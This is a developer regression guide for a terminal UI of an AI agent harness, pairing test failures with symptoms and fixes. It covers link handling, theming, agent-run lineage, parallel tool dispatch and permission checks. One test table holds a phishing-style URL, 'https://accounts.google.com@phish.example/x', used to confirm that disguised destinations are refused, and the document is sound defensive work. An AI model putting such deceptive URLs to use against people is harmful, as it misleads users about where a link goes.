removes the border and padding from the arithmetic survives a sweep over those. Batch 62.


### `remember()` without `refresh_bindings()`

**Symptom:** `test_the_footer_entries_are_grey_until_there_is_history` fails on the second half —
the entry is still dim after a prompt has been submitted.

**Fix:** raise the bindings signal. The `Footer` recomposes off it and nothing in a submit does, so
the bindings are correct, the keys work, and the footer row is grey for the rest of the session. Only
the drawn cell can see it. Batch 63, and `action_arm_quit` carries the same comment for the same
reason. Guard it on the empty-to-non-empty transition: a history never empties, so that is the only
moment the answer changes.

### `check_action` returning `False` for the recall actions

**Symptom:** the two footer entries VANISH on a fresh session and the row reflows when the first
prompt is sent.

**Fix:** return `None`. `Screen.active_bindings` skips a binding only on `is False`; `None` keeps it
marked disabled, which is a greyed entry rather than a missing one — and the press is declined
either way. Batch 57 needs `False` on ctrl+c for the opposite reason: two bindings share that key
and a refused one must give up its slot. Batch 63.

### A history mover that ignores its `current` argument

**Symptom:** `test_an_edit_is_handed_back_rather_than_walked_past` fails, and by hand: recall a
prompt, edit it, press ctrl+up — the edit is gone with no way back.

**Fix:** keep the comparison in `_is_browsing`. The parameter is not a convenience; it is how typing
is detected without watching the keyboard, and dropping it turns the feature into the thing it was
built to prevent. Batch 63.

### Prompt recall bound to `ctrl+p`

**Symptom:** ctrl+p stops opening the command palette; `/theme` still works but the palette's own
theme list no longer reaches `watch_theme`.

**Fix:** it is textual's `COMMAND_PALETTE_BINDING`, bound `priority=True`, and this project enables
the palette deliberately. Do not relocate it to `ctrl+shift+p` either. That advice now rests on
the first sentence rather than on the second: the chord is indistinguishable from `ctrl+p`
without the kitty protocol, and textual enabled that in its Linux drivers alone until 6.6.0
added the Windows driver — so the chord may now be distinguishable on a terminal that
implements the protocol, and may still not be on one that does not. Taking a binding whose
availability depends on the terminal is a worse trade than leaving the palette where textual
put it. Batch 63, re-measured at the 8.2.8 pin move.


### `role_styles` reading a `Theme` slot directly again

**Symptom:** `test_every_role_style_is_one_rich_can_parse[textual-dark]` fails with
`AttributeError: 'NoneType' object has no attribute 'startswith'` — and by hand, the harness dies
at mount and keeps dying, because the theme name is already in the preference store.

**Fix:** read `_palette(theme)`, not `theme.<slot>`. Every slot but `primary` is `Optional[str]`
on textual's own `Theme`, and three of the twelve built-ins the command palette offers leave one
blank or fill it with `ansi_*` names. The fallback is textual's own
`to_color_system().generate()` and it is reached **only** for a blank slot: that derivation is
lossy (`color.lighten(0).hex`, an HSL round trip, moves `#d9a441` to `#D8A441` on 41 values
across the fourteen) and 48× slower than `role_styles` itself. Batch 64.

### `_tint` losing its non-hex guard

**Symptom:** `role_styles(BUILTIN_THEMES["textual-ansi"])` raises `ColorParseError: failed to
parse 'default' as a color`, so every check parametrised over `SELECTABLE_THEMES` errors on that
one id.

**Fix:** keep the guard and the `None` return. On an ANSI theme the terminal owns the sixteen
colours, so there is no RGB to blend a diff band out of — textual's `Color.parse` raises on
Rich's `default`, and blending two ANSI colours hands one back unchanged, so both answers were
wrong before this said so. The row takes the severity colour as its foreground instead, which is
git's convention in a sixteen-colour terminal. Batch 64.

### The quality floors widened to `SELECTABLE_THEMES`

**Symptom:** nine of textual's twelve themes fail a contrast floor and three fail
`test_the_message_roles_are_pairwise_distinct` — `textual-dark`'s `secondary` is 1.89:1 against
its own background against an identity floor of 3.5, `solarized-light`'s foreground is 4.99
against a floor of 7, and `textual-dark`/`textual-light` both set `accent == warning`.

**Fix:** do not widen them. Integrity over all twenty-six (can this be drawn), quality over our
fourteen (is it any good) — the floors are decisions about *our* palettes, and holding somebody
else's themes to them means either a permanently red suite or floors lowered until they say
nothing. The measurement is in `DEVLOG.md` batch 64 so it need not be re-derived. Batch 64.

### `styles_for` containing the failure but saying nothing

**Symptom:** `test_an_unstylable_theme_does_not_take_the_app_down` fails on its second half — the
warning count is 0, or it is 2 after two calls.

**Fix:** warn, and latch on the theme name. Silence is what let `textual-light` and
`textual-ansi` render unstyled for as long as they did — Rich resolves an unparseable style with
`default=Style.null()` and raises nothing — so a contained failure that reported nothing would be
the same defect wearing a better exception story. Latched because `styles_for` runs once per
drawn line; `preferences._remember` deliberately does *not* latch, and its docstring says why
that is right there and wrong here. Batch 64.


### A tool line routed through `inline_spans` instead of `link_spans`

**Symptom:** `test_a_shell_digest_keeps_its_backticks` and
`test_an_mcp_filter_keeps_its_tildes_and_asterisks` fail — the drawn row no longer contains the
digest that was written.

**Fix:** keep the two scanners apart. A tool line is a shell command or a JSON argument, not
prose, and the full grammar does not merely over-decorate one: `# `date`` loses its backticks to
a code span and `~~old~~` loses its tildes. The `_em_edge` rule already saves `*.py`, `2**8` and
`__init__`, which is why this looks safe until it is measured. Batch 65.

### `clickable()` losing the userinfo or the redaction-mark refusal

**Symptom:** the `test_and_nothing_else` table fails on
`https://accounts.google.com@phish.example/x`, or `test_a_redacted_url_is_never_a_target` fails.

**Fix:** both refusals are load-bearing and neither is cosmetic. Userinfo means the part a reader
takes for the destination is not the host — the same hidden-destination attack `[label](url)` is
refused for, through the URL's own syntax. The redaction mark means the harness rewrote the
address, so it is real and simply not the one that was fetched; clicking
`https://x/?api_key=[REDACTED]` would send that literal string to a live host. `REDACTED_MARK` is
`tui/markdown.py`'s own copy of `safety.policy_enforcement.REDACTION_MARKER` because that module
is pure; the two are held against each other by
`test_the_redaction_mark_is_the_one_safety_actually_writes`. Batch 65.

### The origin rule dropped from `_elided`

**Symptom:** `test_a_truncation_that_cut_the_host_resolves_to_nothing` and
`test_a_host_that_did_not_fit_arms_nothing` fail.

**Fix:** restore it. Batch 65 carries an untruncated URL beside a truncated line, which means the
visible text is no longer the target — and the rule that replaces it is that the visible text
still tells you the ORIGIN. Without the check, a line showing `https://very-long-host-nam…` would
open a host nothing on screen names, which is a silent redirect rather than a truncation a reader
can see. Batch 65.

### `rerender()` or `reset()` not touching `_links`

**Symptom:** `test_a_theme_switch_arms_the_same_cells`, or `test_a_new_thread_does_not_inherit_one`.

**Fix:** the side table is keyed by entry index, so both lifetimes are its own. A `rerender()`
without it leaves a `/theme` looking identical and silently unclickable; a `reset()` without it
arms the next thread's Nth line with the previous thread's URL. **The second is invisible on the
live path** — a write is handed its links as an argument — so its test has to redraw before it
asserts, which is how the first version of that test passed against a broken `reset()`. Batch 65.

### `ReplayEntry` narrowed back to `(role, text)`

**Symptom:** `test_a_replayed_tool_call_is_as_clickable_as_a_live_one` fails, and every unpack in
`tui/app.py`, `main.py`, `test_thread_legibility.py`, `test_cli.py` and `test_storage_e2e.py`
raises `ValueError: too many values to unpack`.

**Fix:** the third element is a click target, and the module docstring's reason for a narrow tuple
is untouched by it — a link is a rendering fact, not history. Removing it would leave a resumed
thread drawing the same characters as the live turn and refusing to open them. Batch 65.

### `_transcript` going back to a per-access `query_one`

**Symptom:** `test_a_routed_warning_under_a_modal_reaches_the_transcript`,
`test_a_worker_report_under_a_modal_does_not_kill_the_app`, or
`test_a_timeout_narration_under_a_modal_reaches_the_transcript` — and in the wild, an unrelated
test dying on `NoMatches: No nodes match '#transcript'`.

**Fix:** `app.query_one` searches the ACTIVE screen, so a pushed modal shadows the transcript.
The callers that cannot guard against that are the ones whose occasion IS an open modal — a
routed WARNING from any thread, a startup worker's report, the timeout narration — and an
exception out of a Textual message handler kills the app. `on_mount` holds the widget; the query
remains only as the fallback for an app that never mounted. Note the second half: the
`except NoMatches` guards this replaced **dropped the line**, so a warning raised during an
approval went nowhere the user could see. Batch 66, amending #104.

### Removing `_blocking_modal`'s guard around the timeout narration

**Symptom:** `test_a_narration_that_raises_still_declines`.

**Fix:** the method's contract is to return the dismissal value raw, and `None` is what
`interaction.decode` turns into the declining default. A narration that raises used to replace
that with an exception, which `interaction.ask` then logged as "response channel raised" — naming
the narration as the cause of a refusal it did not cause and hiding the real failure. Batch 66.

### `AgentSpan` losing `id` or `parent_id`

**Symptom:** `test_two_spans_sharing_a_name_and_depth_have_different_ids`, or
`test_a_nested_span_names_its_parent`.

**Fix:** batch 59's span was a `(name, depth)` pair, and two runs that agree on both are
indistinguishable -- which is why `TuiActivity.exit` pops by last match. Both fields are defaulted
so `AgentSpan("explore", 1)` still constructs, which is what every existing call site writes.
Batch 67.

### The ContextVar reset moving out of `span()`'s `finally`

**Symptom:** `test_a_raising_run_restores_the_previous_span`, and
`test_current_is_the_innermost_open_span`.

**Fix:** the reset pairs with `exit` and must run when the body RAISES, for a reason one step
worse than the row that stays on screen: a token that outlived its frame makes the NEXT sibling a
child of a run that has finished. That is lineage which is wrong rather than missing. Batch 67.

### `bind()` not called, or called somewhere other than after the memory is built

**Symptom:** `test_a_run_under_a_span_binds_its_new_thread` (the production call site, driven
rather than stubbed -- every other spawn test patches `run_agent_conversation` out, so without
this one the mutation survives them all).

**Fix:** the span opens before the run creates its thread, so the address arrives later, and it
has to arrive DURING the run or a sidebar row could only be opened after the run it describes had
finished. Batch 67.

### A dispatch-contract assertion written as `call_id=ANY`

**Symptom:** none -- and that is the entry. `ANY` matches `None`, so a mutation replacing
`call_id=call.id` with `call_id=None` passes, while a spawned thread silently loses the only thing
that ties it to one `▸ spawn_subagent` line. Pin the real id. Found by the mutation pass, not by
the suite. Batch 67.

### `child_threads()` gaining a `kind` filter

**Symptom:** `test_child_threads_does_not_filter_by_kind`.

**Fix:** which kinds exist is §27's question. A filter here would need widening the moment a sixth
thread source appears -- which is exactly how §27's own picker came to miss the compactor. Batch
67.

### `AgentPanel.show()` taking `(name, depth)` tuples again

**Symptom:** `AttributeError: 'tuple' object has no attribute 'name'` from `_redraw`, and every
`TestTheAgentPanel` case.

**Fix:** rows are `AgentRow` since §47. A tuple cannot name a run, and a row that cannot name its
run cannot be opened. `show()` also takes the root thread, which is what arms the root row. Batch
68.

### `TuiActivity.exit` going back to last-match removal

**Symptom:** `test_the_row_removed_is_the_one_that_ENDED` -- and nothing else, which is the point.

**Fix:** nested spans unwind innermost-first, so last-match agrees with by-id for every case
`span()` can produce. It disagrees when two runs of one agent are open as peers and either may
finish first, dropping the one still going and keeping the one that ended with its address
attached. Drive `enter`/`exit` directly to see it; a `with` block cannot express it. Batch 68.

### Reading a panel row by computing its y

**Symptom:** a test that scans `renderable.plain.splitlines()` finds the root row and misses the
last one.

**Fix:** `#agent-panel` has `padding-top: 1`, so the Nth content line is at **y = N+1**. Rows are
armed with style metadata and read back through `get_style_at`; scan `panel.region.height`, not
the content lines. This is the whole argument for metadata over arithmetic -- the arithmetic
version is a second copy of the widget's layout, and it was wrong the first time it was written.
Batch 68.

### `refresh_agent_panel` reading `self.memory`

**Symptom:** `test_painting_the_panel_does_not_start_a_conversation`.

**Fix:** the property creates a thread on first use, and this runs at mount and on every span --
so every launch would leave a phantom empty conversation in the picker. `refresh_goal_banner` and
`refresh_todo_panel` read the field for the same reason. Batch 68.

### `_paint_entries` reaching for `self._transcript` instead of its argument

**Symptom:** `test_it_switches_the_pane_and_paints_the_run`, and
`test_a_turn_writes_to_the_LIVE_pane_while_a_run_is_open`.

**Fix:** it takes the target because that is what makes it reusable, and it is shared with the
resume path because what a stored thread LOOKS like is a policy decision with one translation site
(§26 L2). Two copies would be free to disagree about the thinking rule, which is the divergence
that rule exists to close. Batch 69.

### `close_thread_view` added back to `_cmd_new`

**Symptom:** none, and that is the entry. The prompt is DISABLED while the viewer is open, so no
slash command can be typed and the close cannot fire. A guard that cannot fire still reads as the
thing protecting you. The reachable path is the thread picker (ctrl+t is an app binding), and
`switch_to_thread` closes the view; `test_the_thread_picker_is_still_reachable` is what keeps that
premise honest. Batch 69.

### Asserting a poll by the pane's CONTENT

**Symptom:** none -- the test passes against a viewer that repaints every second.

**Fix:** repainting identical entries produces an identical pane, so content cannot tell a gated
redraw from an ungated one. What ships is a reader thrown back to the bottom once a second. Count
`reset()` calls. Batch 69.

### Asserting an inert click by where the viewer ENDS UP

**Symptom:** none -- the test passes against a widget that posts on every stray click.

**Fix:** `open_agent_thread` refuses anything that is not a uuid, so a `ThreadSelected(None)` is
already harmless when it arrives. What ships is a warning logged every time someone clicks the
padding. Assert that the message was never posted. Both widgets need their own case: the two
guards are separate code, and a mutation to one survives a test that only drives the other. Batch
69.

### The lineage trail built from navigation history

**Symptom:** `test_the_trail_is_read_from_STORAGE_not_from_where_you_walked`.

**Fix:** open a sub-subagent directly, having never passed through its parent, and a
history-derived trail shows one step where the stored parent link shows three. Slice 1 put the
link in a column so this could be read rather than reconstructed. Batch 69.

### `ToolSpec.opens_thread` removed, or read by name instead

**Symptom:** `test_spawn_subagent_declares_that_it_opens_a_thread`,
`test_a_tool_that_opens_no_thread_arms_nothing`, or
`test_replay_asks_the_registry_rather_than_naming_the_tool`.

**Fix:** two readers ask which tool calls open a run -- `core/replay.py` for a stored line and the
TUI for a live one -- and a tool name written in both is how they come to disagree about which
lines are clickable. Declared on the tool, R13's shape. Batch 70.

### Arming the whole spawn line instead of the agent's name

**Symptom:** `test_only_the_agent_NAME_is_armed`.

**Fix:** the digest on a spawn line is the TASK, a sentence a reader wants to read rather than a
control. The armed region has to be as wide as the thing it is about, and no wider. Batch 70.

### A `reset()` test that writes ONE line into an emptied transcript

**Symptom:** none -- the test passes against a `reset()` that clears nothing.

**Fix:** the side table is keyed by entry index. The old spawn sat at index 2 (two banner lines
precede it), so a single new line lands at index 0 where nothing was ever recorded. Write enough
lines to REACH the index the old entry held, and redraw before asserting -- on the live path a
write is handed its call as an argument, so a stale table is invisible. **This is the second time
this exact test shape has been wrong**; see batch 65's entry for `_links`. Batch 70.

### Observing the live pairing only through a hand-built `AgentRow`

**Symptom:** none -- the sink can drop `span.call_id` and every test still passes.

**Fix:** posting an `AgentStackChanged` with a row you built yourself skips the sink, which is the
link that carries a running child's call to the transcript. One test has to open a real span.
Batch 70.

### Binding the run picker to a key the prompt claims

**Symptom:** `test_ctrl_g_is_not_shadowed_with_the_prompt_focused`.

**Fix:** `TextArea` claims a/c/d/e/f/k/u/v/w/x/y/z, `App` claims ctrl+c and ctrl+q, textual claims
ctrl+p, and this app already holds ctrl+t, ctrl+l and ctrl+up/down. The test measures
`screen.active_bindings` **with the prompt focused**, which is the only state where the answer
means anything. Batch 71.

### Writing the asking run into the payload BEFORE the tool's own

**Symptom:** `test_a_tool_cannot_claim_to_be_the_asker`.

**Fix:** `payload.update(request_payload)` runs after, so a tool declaring `asking_agent` would
overwrite the harness's answer -- an agent-supplied claim replacing a harness fact, which is the
inversion §42's RA6 orders the permission modal to prevent. Nothing declares that key today; the
point is that nothing can. Found by a mutation, not by the suite. Batch 71.

### Asserting a cancelled picker by where the viewer ENDS UP

**Symptom:** none -- the test passes against a callback that opens unconditionally.

**Fix:** `open_agent_thread(None)` refuses anything that is not a uuid, so nothing moves either
way. What ships is a warning logged every time somebody presses escape. Assert the call was never
made. **Third time this shape has appeared** -- see batches 69 and 70. Batch 71.

### Testing a span at the run's own function and stopping there

**Symptom:** none -- the shell can pass `activity=None` and every test still passes.

**Fix:** three of slice 6's four mutation survivors were this. `_run_initializer` opening a span
proves nothing about `/init` reaching it, and `_summarize` taking a parent thread proves nothing
about `compact()` supplying one. Test the CHAIN as well as the leaf: the same gap slice 4's pass
found where the sink copies a call onto its row. Batch 72.

### Giving the initializer a parent thread

**Symptom:** `test_the_initializer_records_what_it_was`.

**Fix:** `/init` scaffolds a project. It is not a child of the conversation the command was typed
in, and `generate()` is shell-agnostic and has no conversation to name. Batch 72.

### Dropping the compactor's `parent_thread_id`

**Symptom:** `test_the_compactor_says_whose_conversation_it_summarised`, or
`test_compaction_tells_the_compactor_whose_thread_it_is`.

**Fix:** the compactor's thread is a child of the one it summarises in the only sense that
matters. It has no parent CALL, because no tool started it -- findable by its conversation and by
nothing else. Batch 72.

### Dropping `activity` at any orchestrator hop

**Symptom:** `test_a_pass_runner_hands_it_down`, `test_the_retrying_pass_runner_hands_it_down`, or
`test_the_reviewer_gets_one_too`.

**Fix:** the sink is threaded explicitly beside `authorization` because both are run-scoped values
the layers between the entry point and the model call only forward. Batch 59 stopped at
`stream_deep_research_mode`'s signature; batch 73 is the rest of the chain, and each hop is a
place it can be dropped. Batch 73.

### A pass's span not bracketing the whole generator

**Symptom:** `test_an_abandoned_pass_still_closes_its_row`.

**Fix:** it has to close on `GeneratorExit`, which is §22's abandonment case -- a TUI quitting
mid-run. Drive it with `next()` then `close()`; a test that drains the generator normally cannot
see the difference. Batch 73.

### Giving a research pass a parent THREAD

**Symptom:** `test_a_pass_thread_says_which_pass_it_was`.

**Fix:** a pass is a child of the RUN, and a run is not a conversation. `PipelineRun.pass_threads`
already indexes them (§27 T2), so a parent column here would be two records of one edge -- the
producer/consumer shape this project keeps finding. Batch 73.

### The partition run sequentially, or `parallel` matched by name

**Symptom:** `test_three_parallel_calls_overlap`, and
`test_the_loop_asks_the_registry_rather_than_naming_the_tool`.

**Fix:** NA9. The flag is declared on the `ToolSpec` and asked of the
registry, so `core/loop.py` names no tool -- `opens_thread`'s trade one
question over. Note the overlap test asserts with a BARRIER whose timeout is
the assertion: a sequential implementation fails in seconds rather than
passing slowly. Batch 74.

### `_dispatch_one` gaining a loop, or `dispatch` moving up into `_run`

**Symptom:** `test_the_loops_authorization_cannot_outlive_one_tool_call`.

**Fix:** the per-call body is a FUNCTION now, and that is the invariant --
its whole scope is one call, so the widening batch 60's call id was chosen to
fail closed against cannot be written. A loop inside it, or a dispatch call
at turn scope in `_run`, is the same defect wearing the shape the refactor
made available. The test moved with the body rather than being deleted; it
used to pin that the authorization never escaped `for call in
response.tool_calls:`. Batch 74.

### Results added in completion order

**Symptom:** `test_results_are_ordered_by_the_model_not_by_completion`.

**Fix:** NA11. `add_tool_result` pairs each result to its `tool_use` by id
(M4/D20), so a turn assembled in completion order is a thread that will not
resume. The test forces the handlers to finish in REVERSE with an event
chain, so a completion-ordered implementation produces exactly the reversed
list. Batch 74.

### The conduit drained after the last future instead of during

**Symptom:** `test_a_permission_request_arrives_while_a_sibling_is_still_running`.

**Fix:** NA15, and this is the mutation the slice was most likely to lose.
Collecting every event and yielding it after the batch satisfies every other
assertion in the file, so the test makes the drain a PRECONDITION: a sibling
blocks until the driver has yielded the gated call's request, and a batched
implementation deadlocks. Batch 74.

### A raising sibling propagating, or a LONE raising call being converted

**Symptom:** `test_a_raise_becomes_that_calls_error_and_spares_its_siblings`,
and its negative `test_a_LONE_raising_call_still_ends_the_turn`.

**Fix:** NA14 is scoped to a batch, and the negative is what scopes it. §16
AC3 pins that a raising tool must not kill the app, and the mechanism it pins
is the exception LEAVING `_run`; a conversion applied to every call would
quietly retire that. Batch 74.

### A test of the sign-off gate whose ask returns instantly

**Symptom:** `test_the_same_agent_twice_in_one_response_is_one_question`
passes with the gate lock REMOVED.

**Fix:** measured twice over, and worth reading before writing any test of a
window in this codebase. A barrier at `request_payload` was not enough:
instrumenting `recall_signoff` and `remember_signoff` under the mutation
showed the second worker completing recall AND remember before the first
worker's recall ran, because the whole window is a handful of Python
statements with no I/O and fits inside one 5ms GIL quantum. What was missing
is that a real ask is SLOW -- it is a human reading a modal -- so the test
holds the fake shell open for 100ms. That is modelling the window, not tuning
around a race. Batch 74.

### A concurrency test whose race fits inside one GIL quantum

**Symptom:** `test_concurrent_exits_leave_no_row_behind` passes with
`TuiActivity`'s lock removed.

**Fix:** the same lesson from the other side, and the same batch found both.
Twelve rows at the default switch interval never landed in the window between
reading `self._stack` and assigning the rebuilt list, because a twelve-element
comprehension takes about a microsecond against a 5ms quantum. The test now
WIDENS the window (a few hundred rows) and raises the preemption rate
(`sys.setswitchinterval`, restored in a `finally`). A test whose input cannot
discriminate is batch 14's lesson, reached from the scheduling side. Batch 74.

### `lineage_rows` keyed on `span_id` instead of row identity

**Symptom:** `test_hand_built_rows_that_share_a_defaulted_id_all_survive`.

**Fix:** `AgentRow.span_id` defaults to `""`, so every hand-built row shares
one and a set of ids treats the second as already drawn and DROPS it. Live
rows always carry a real id, so this is invisible in the app and wrong in
every test that builds rows directly -- which this file already records tests
here doing. Batch 74.

### Testing `lineage_rows` and calling it the panel

**Symptom:** `test_the_PANEL_draws_them_in_lineage_order` passes while
`AgentPanel._redraw` iterates the raw stack.

**Fix:** the leaf-versus-chain trap, for the fourth time in this section, and
it survived six direct tests of the helper. A correct function nothing calls
is not a correct panel, so one test asserts on what the widget DREW. Batch 74.

### WAL turned off, or the busy timeout left implicit

**Symptom:** `TestConcurrentWriters`.

**Fix:** NA18, and the test runs EIGHT writers rather than three on purpose.
Measured: at `SUBAGENT_MAX_PARALLEL`'s three a rollback-journal database does
not lock, so a test at the real ceiling passes without the fix and proves
nothing. Eight is where the unfixed configuration produced "database is
locked". The busy timeout was already 5000ms from SQLAlchemy's pysqlite
default and is restated explicitly, because the measurements rest on it.
Batch 74.

### Indenting a run by `AgentRow.depth` again

**Symptom:** `test_the_column_is_the_walk_and_not_the_reported_depth`,
`test_the_PANEL_draws_a_passs_child_one_level_in`, or
`test_it_draws_the_same_shape_the_panel_does`.

**Fix:** `lineage_rows` returns `(row, level)` pairs, and the level is the
deeper of the walk's column and the row's own depth -- not `depth` alone.
`depth` is the number C3 bounds, about how many SPAWNS deep a run is, and a
research pass adds a display level without adding a spawn level: the pass and
the subagent it spawned both report 1, so drawing by depth put a child level
with its parent. Both surfaces that draw this list go through the walk, which
is what keeps the sidebar and ctrl+g from offering different shapes. Batch 75.

### Widening an `ask_*_blocking` signature

**Symptom:** `test_two_spawns_are_live_as_peers_in_the_sidebar`, with a `TypeError`
about a lambda taking two positional arguments and being given four.

**Fix:** a stub that LISTS the signature breaks on each argument added to it. When
the sign-off learned to name the run doing the asking, the one stub written as
`lambda agent, candidates: set()` broke -- and it broke in the file about
CONCURRENCY, three files away from the change, which is why the batch's own
targeted runs missed it. Stubs for these six methods swallow their arguments
(`lambda *_a, **_kw: ...`), for `FakeMemory`'s stated reason: what they are for is
the ANSWER, not the call. Batch 75.

### The run picker iterating `_agent_stack` raw

**Symptom:** `test_it_draws_the_same_shape_the_panel_does`.

**Fix:** the panel has ordered by lineage since NA17; the picker indented by a
column in ARRIVAL order, so two peers each spawning a grandchild drew A's
child under B -- NA17's own defect in the surface NA17 did not touch. Both call
`lineage_rows` now. Batch 75.

### Keying a parallel batch's outcomes by `call.id`

**Symptom:** `test_two_calls_sharing_one_id_still_get_their_own_answers`, and
`test_stream_openai_missing_ids_get_their_own_uuids` for the other half.

**Fix:** the id is the PROVIDER'S. `core/client.py`'s v1-compatible branch starts
a tool-call fragment's id at `""` and fills it only if a delta carries one -- the
same branch that accumulates `function.name` across deltas because some providers
split it -- so two spawns can arrive equal on that field. A dict then hands every
call in the batch the last-finishing worker's outcome, which is one child's answer
reported for another child's call. `_dispatch_parallel` keeps
`(call, outcome, failure)` in submission order, and the adapter defaults a missing
id as its Google sibling always has. Do not reintroduce a lookup here: the same id
also pairs `app._spawn_threads` to a spawn line and `parent_call_id` to a stored
thread, so a batch that trusts it is trusting it three times. Batch 76.

### A shell that renders a payload key the other one drops

**Symptom:** `TestTheTerminalNamesTheAskingRun` in `tests/test_cli.py`, or
`TestTheOtherTwoQuestionsNameTheirAskerToo` in `tests/test_agent_navigation.py`.

**Fix:** audit #7's shape one level down. A missing BRANCH is loud once you look
for it -- the kind falls through to its declining default -- but a branch that
drops a FIELD looks perfectly wired up. `asking_agent` / `asking_depth` reached
the TUI's permission modal for a section and nothing else: not the sign-off, not
the model's own question, and not `main.py` at all. Every kind that can be raised
from inside a run renders it in both shells now. `_asker` in `main.py` and
`asker_label` in `tui/screens.py` are each ONE function for their shell's three
sites, so the placement rule has one copy per shell. Batch 76.


## The textual pin: 1.0 to 8.2.8

`requirements.txt` carries the record and the re-measure list. What follows is
what breaks in the SUITE, which is a different list.

| Change | What breaks | Symptom / fix |
|---|---|---|
| Reading `.renderable` off a Static | 43 sites across 8 test files, `AttributeError: 'X' object has no attribute 'renderable'. Did you mean: 'render_line'?` | It is `.content` since textual 6.0.0 -- the object originally set, so `.plain`, `.spans` and `str()` all still answer. `.visual` is the RENDERED form and is a different question |
| Handing `Static.update` a Rich `Text` from an unmounted widget | 18 tests, `NoActiveAppError` out of `visualize()` | `widgets.as_content` is the funnel. `visualize` converts a Rich `Text` with `console=widget.app.console`, and this suite builds these panels bare everywhere; `Content.from_rich_text` takes `console=None` and falls back to `RichStyle.parse`, which is parity for every style string `role_styles` emits (measured: 1085 of them, all 35 themes, zero differences) |
| Setting `no_wrap` / `overflow` on a `Text` a Static will draw | **Nothing, and that is the entry** | A `Content` carries neither, and the conversion drops both -- so `#agent-panel`, `#thread-crumb` and `#slash-suggest` lost their wrapping rule silently when the pin moved. They are `text-wrap` / `text-overflow` in `app.tcss` now. Do not put them back on the Text |
| `BUILTIN_THEMES["textual-ansi"]` | `KeyError` | 8.2.5 replaced it with `ansi-dark` and `ansi-light`. `test_themes.ANSI_THEMES` derives them off `Theme.ansi`, which is the field that stays true across the next rename |
| Anything counting textual's built-in themes | The two documented-count tests, and every parametrised theme check silently covering more | The roster is 21, not 12, so `SELECTABLE_THEMES` is 35. Being DERIVED is what made that a count change rather than a coverage hole |
| Reading `.dim` off a drawn footer cell | `test_the_footer_entries_are_grey_until_there_is_history` | textual resolves `dim` into the drawn COLOUR now. Measured on dark-plain: a disabled `^UP` was `dim=True` at `#b8c1d1` on 1.0.0 and `dim=False` at `#838a98` on 8.2.8, against a live `^c` that is `#b8c1d1` on both. `_footer_dim` compares against a live entry instead, which is true on either version |
| Reading `.visual._renderable` | `test_rationale.py` twice, loudly; `test_tui.py`'s viewport sweep SILENTLY, by falling into its own `except` and answering `"rows"` for every widget | A Rich `Text` becomes a `Content` that carries `.plain` itself. `_plain`'s `getattr(visual, "_renderable", visual)` is what carried that helper across, and is not dead code |
| Reading `.style` off what a widget handed `update()` | Two banner tests | `conftest.whole_line_style`. A whole-text style survives `from_rich_text` as the literal string on one span; a per-`append` style is resolved into a `textual.style.Style` and reads back as `rgb(154,109,16) bold` rather than as what was typed |

**Two things this pin move did NOT buy, both of which look like it should have.**
Terminal text selection exists since 2.0.0, but `RichLog` implements no
`get_selection` and the default extracts from `self._render()` -- a debug
`rich.panel.Panel` on a `ScrollView` subclass -- so the transcript is still not
selectable and `/copy` is still the answer. And the kitty keyboard protocol
reaches the Windows driver since 6.6.0, so `shift+enter` is no longer
unreachable there -- but claiming it reverses a locked decision and belongs in
its own batch.

**One pre-existing hole the batch surfaced.** `Button` given a `str` parses it as
markup and raises on an unbalanced tag -- measured on 1.0.0 AND 8.2.8, so this
was never safe. The single-select branch of the question modal was handing it
`ask_user`'s options, one line below a multi-select branch that had wrapped its
own since batch 42. `Button` is in the AST guard's `WIDGETS` now.


## `spawn_targets` — an agent says who it may spawn

Three CI jobs went red on the roster expansion, from three unrelated causes. Two
were repairs (stale documented counts; a test that imported textual's Windows
driver and therefore `msvcrt`, which no Linux runner has). This is the third,
and it is the only one that changed behaviour.

| Change | What breaks | Symptom / fix |
|---|---|---|
| `spawn_subagent` can now be refused for WHO is being spawned | A test spawning agent `b` from a context whose `spawn_targets` excludes it | The refusal is `refusal_reason`'s last check, after depth, params and unknown-name — that order is the live contract the model already sees. An unknown name still reports "Unknown agent" rather than "not permitted" |
| `plan` may spawn `explore`, `review`, `writer` and `test` — and nothing else | Anything expecting a `plan` turn to delegate to `build` or `general` | Intended, and it is the decision `plan` exists for: the plan is the deliverable and a person iterates on it before anything is built. `general` is excluded too, or the restriction would have been one hop deep — it holds `write`/`edit` and can spawn `build` itself |
| A spawn that used to run DEGRADED now returns an error | Code reading a degraded child's output | This is the fix, not a side effect. C6 intersects a child's tools with its parent's, so `plan` spawning `build` returned a `build` with no `write` and no `edit`, and neither side could tell — A4's failure on the permission axis, which A13 exists to prevent |
| `agent_catalog_text()` takes an optional roster and filters by it | A test calling it positionally with something else | `with_catalogs` passes `context.spawn_targets`. Advertising an agent the pre-flight will refuse is D24's defect, and worse here than for a tool, because the prose around the list instructs the model to spawn one |
| `ToolContext` has a fourth field, and `child_context` composes it | A hand-built `ToolContext` compared by equality | `spawn_targets=None` is the default and means NO OPINION — every spawnable agent — which is what every definition written before the field meant. `[]` means none, and is deliberately not collapsed to `None` by the loader |
| A bad `spawn_targets` SKIPS the agent file | `spawn_targets: explore` (a string, not a list), or a list with a non-string in it | Warn-and-skip, the contract every other typed field in `_parse_md_file` has. The element check is `additional_tools`' lesson one field over: the consumer is a membership test against an agent name, so a non-string parses clean and then never matches |
| A13's superset is asserted by a SWEEP, not for two named agents | Adding a spawning agent whose whitelist misses a tool one of its targets declares | `test_every_spawner_holds_a_superset_of_what_it_may_spawn` fails naming the pair and the tools. The named version is what broke: `build` arrived declaring `write`/`edit`, and `plan`'s frontmatter comment was updated to claim a superset the whitelist under it never gained. The comment was the only thing that changed |
| Widening a parent is no longer the automatic fix for that failure | Adding `write`/`edit` to `plan` to make the sweep green | `test_plan_cannot_reach_either_agent_that_writes` fails. Both ways satisfy the superset rule and only one keeps the agent's reason for existing |

## `config.yaml` — the values left `config.py`

`config.py` is a shim now: `config_schema.py` reads `config.yaml` once at import
and `config.py` publishes the result as plain module globals. Every existing
access pattern still works — `monkeypatch.setattr(config, ...)`, a bare
`config.X = v`, `mocker.patch.dict(config.__dict__, ...)`,
`getattr(config, "<NAME>", default)` — and 134 mutation sites across 32 test
files were left untouched on purpose. What follows is what does break.

| Change | What breaks | Symptom / fix |
|---|---|---|
| Delete, rename or move `config.yaml` | Everything — the first `import config` raises | `ValueError` naming the file and its path. Intended: there are no defaults behind the file, because a default is a value nobody chose, silently in force (the D24 `fetch_url` defect). Restore it from git, or from the package if this is an installed copy |
| Add a key to `config.yaml` with no schema field | `import config` raises `extra_forbidden` naming the key | Add the field to `config_schema.HarnessConfig` too. Unknown keys are refused for `_KNOWN_SETTINGS`'s reason: a typo must not masquerade as a setting |
